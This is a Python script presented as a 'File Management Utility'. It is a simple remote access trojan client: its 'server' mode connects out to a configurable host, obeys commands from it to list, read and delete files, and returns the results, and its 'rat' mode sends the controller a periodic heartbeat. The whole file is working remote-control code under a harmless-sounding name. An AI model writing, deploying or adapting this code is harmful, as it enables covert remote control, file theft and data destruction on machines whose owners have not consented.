import os
import sys
import json
import time
import socket
import threading

SERVER_HOST = "127.0.0.1"  # Change to your server's IP address
SERVER_PORT = 9000         # Change to your desired port
BUFFER_SIZE = 1024

def list_files(directory):
    try:
        files = os.listdir(directory)
        return "\n".join(files)
    except FileNotFoundError:
        return f"Error: Directory '{directory}' does not exist."
    except PermissionError:
        return f"Error: Permission denied for directory '{directory}'."

def read_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            return file.read()
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied for file '{file_path}'."
    except Exception as e:
        return f"Error reading file '{file_path}': {e}"

def delete_file(file_path):
    try:
        os.remove(file_path)
        return f"File '{file_path}' deleted."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to delete file '{file_path}'."
    except Exception as e:
        return f"Error deleting file '{file_path}': {e}"

def embed_metadata(file_path):
    metadata = {
        "unique_id": os.path.basename(file_path),
        "last_modified": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(os.path.getmtime(file_path))),
    }
    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write("\n---METADATA---\n")
            file.write(json.dumps(metadata))
        return f"Metadata added to '{file_path}'."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to modify file '{file_path}'."
    except Exception as e:
        return f"Error embedding metadata into file '{file_path}': {e}"

def read_metadata(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
        if "---METADATA---\n" in lines:
            metadata_index = lines.index("---METADATA---\n") + 1
            metadata = json.loads("".join(lines[metadata_index:]))
            return f"Metadata for '{file_path}': {metadata}"
        else:
            return f"No metadata found in '{file_path}'."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to read file '{file_path}'."
    except Exception as e:
        return f"Error reading metadata from file '{file_path}': {e}"

def handle_command(command, args):
    if command == "list":
        return list_files(args)
    elif command == "read":
        return read_file(args)
    elif command == "delete":
        return delete_file(args)
    elif command == "embed_metadata":
        return embed_metadata(args)
    elif command == "read_metadata":
        return read_metadata(args)
    else:
        return f"Error: Unknown command '{command}'."

def server_handler():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print(f"Connected to server at {SERVER_HOST}:{SERVER_PORT}")
            while True:
                message = client_socket.recv(BUFFER_SIZE).decode('utf-8')
                if not message:
                    break
                print(f"Received command: {message}")
                try:
                    data = json.loads(message)
                    command = data.get("command")
                    args = data.get("args", "")
                    result = handle_command(command, args)
                except Exception as e:
                    result = f"Error processing command: {e}"
                client_socket.sendall(result.encode('utf-8'))
    except Exception as e:
        print(f"Error connecting to server: {e}")

def rat_service():
    while True:
        time.sleep(60)  # Send updates every 60 seconds
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((SERVER_HOST, SERVER_PORT))
                update = {"status": "alive", "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}
                client_socket.sendall(json.dumps(update).encode('utf-8'))
        except Exception as e:
            print(f"Error sending update to server: {e}")

def print_help():
    print("File Management Utility")
    print("Usage:")
    print("  python file_manager.py list <directory>       - List files in a directory")
    print("  python file_manager.py read <file>           - Read and display file contents")
    print("  python file_manager.py delete <file>         - Delete a file")
    print("  python file_manager.py embed_metadata <file> - Embed metadata into a file")
    print("  python file_manager.py read_metadata <file>  - Read metadata from a file")
    print("  python file_manager.py server                - Run server handler for remote commands")
    print("  python file_manager.py rat                   - Run background service for periodic updates")
    print("  python file_manager.py help                  - Show this help message")

def main():
    if len(sys.argv) < 2:
        print("Error: Missing command.")
        print_help()
        return

    command = sys.argv[1]

    if command == "server":
        server_thread = threading.Thread(target=server_handler, daemon=True)
        server_thread.start()
        server_thread.join()
    elif command == "rat":
        rat_thread = threading.Thread(target=rat_service, daemon=True)
        rat_thread.start()
        rat_thread.join()
    else:
        if command in ["list", "read", "delete", "embed_metadata", "read_metadata"]:
            if len(sys.argv) != 3:
                print(f"Error: Missing argument for command '{command}'.")
                print_help()
            else:
                result = handle_command(command, sys.argv[2])
                print(result)
        elif command == "help":
            print_help()
        else:
            print(f"Error: Unknown command '{command}'.")
            print_help()

if __name__ == "__main__":
    main()

